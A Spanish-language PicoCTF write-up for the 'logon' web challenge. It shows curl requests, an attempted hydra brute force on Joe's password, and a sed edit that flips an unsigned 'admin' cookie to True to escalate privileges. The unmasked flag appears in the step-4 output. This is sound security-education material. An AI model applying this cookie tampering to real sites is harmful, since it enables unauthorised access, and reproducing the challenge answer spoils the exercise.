# Writeup: logon
**Categoría:** Easy
**Fecha de conversión:** 2026-04-24

---

Writeup – Reto “logon” (PicoCTF)


Categoría: Web Exploitation

Autor: madStacks

Descripción: ¿Puedes iniciar sesión en este sitio? (La pista adicional decía: Hmm it doesn't seem to check anyone's password, except for Joe's?)

1. Reconocimiento inicial

Se nos proporciona una URL:

http://fickle-tempest.picoctf.net:59417/ (el puerto puede variar según la instancia activa).


Al acceder, vemos un formulario de login simple que pide nombre de usuario y contraseña. Al inspeccionar el código fuente, encontramos un mensaje de error dentro de un <div class="alert alert-danger">:

html


I'm sorry Joe's password is super secure. You're not getting in that way.


Este mensaje aparece cuando falla la autenticación. La pista adicional del reto indica que solo se comprueba la contraseña de Joe, lo que sugiere que cualquier otro usuario puede iniciar sesión con cualquier contraseña.

2. Exploración con curl

Comprobamos el comportamiento con diferentes usuarios:

bash


```bash
# Intentamos loguearnos como Joe con una contraseña incorrecta
```

curl -X POST -d "user=Joe&password=wrong" http://fickle-tempest.picoctf.net:59417/login


La respuesta contiene el mensaje de error. Probamos con un usuario cualquiera:

bash


curl -X POST -d "user=test&password=anything" http://fickle-tempest.picoctf.net:59417/login


Esta vez la respuesta no contiene el error; en su lugar, el servidor establece cookies de sesión. Para capturarlas, usamos -c cookies.txt:

bash


curl -c cookies.txt -L -X POST -d "user=test&password=anything" http://fickle-tempest.picoctf.net:59417/login


El archivo cookies.txt contiene:

text


```bash
# Netscape HTTP Cookie File
```

fickle-tempest.picoctf.net	FALSE	/	FALSE	0	admin	False

fickle-tempest.picoctf.net	FALSE	/	FALSE	0	username	test

fickle-tempest.picoctf.net	FALSE	/	FALSE	0	password	anything


Observamos que las cookies están en texto plano y no están firmadas. La cookie admin está establecida como False.

3. Intento de fuerza bruta (falso positivo)

Dado que la contraseña de Joe es la única validada, intentamos encontrar su contraseña con hydra para después loguearnos como él y quizás obtener el rol de administrador. Sin embargo, hydra daba falsos positivos porque la cadena de error en la respuesta incluye entidades HTML (&#39;). Aunque ajustamos la cadena, hydra seguía reportando contraseñas válidas que en realidad no lo eran. Esto se debía a que la respuesta de error era la misma para cualquier contraseña de Joe, y hydra interpretaba cualquier respuesta que no contuviera exactamente la cadena de fallo como éxito.

4. Explotación mediante modificación de cookies

Como las cookies son modificables, podemos cambiar directamente admin=False a admin=True. Editamos el archivo cookies.txt:

bash


sed -i 's/admin\tFalse/admin\tTrue/' cookies.txt


Ahora el contenido del archivo es:

text


fickle-tempest.picoctf.net	FALSE	/	FALSE	0	admin	True

fickle-tempest.picoctf.net	FALSE	/	FALSE	0	username	test

fickle-tempest.picoctf.net	FALSE	/	FALSE	0	password	anything


Con la cookie modificada, accedemos a la página que probablemente contiene la bandera. Probamos /**flag**:

bash


curl -b cookies.txt -L http://fickle-tempest.picoctf.net:59417/flag


La respuesta muestra la bandera:

html


<p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}</code></p>


5. Reflexión

```
    El servidor confiaba ciegamente en las cookies enviadas por el cliente, lo que permitió escalar privilegios simplemente cambiando el valor de admin.

    La pista de que solo se comprueba la contraseña de Joe era clave para entender que cualquier otro usuario podía autenticarse sin necesidad de contraseña válida.

    La fuerza bruta no era necesaria; bastaba con manipular las cookies.

    Este reto enseña la importancia de no confiar en datos enviados por el cliente sin una verificación adecuada (firmas, tokens, etc.).

```

6. Flag final
text


picoCTF{***************}

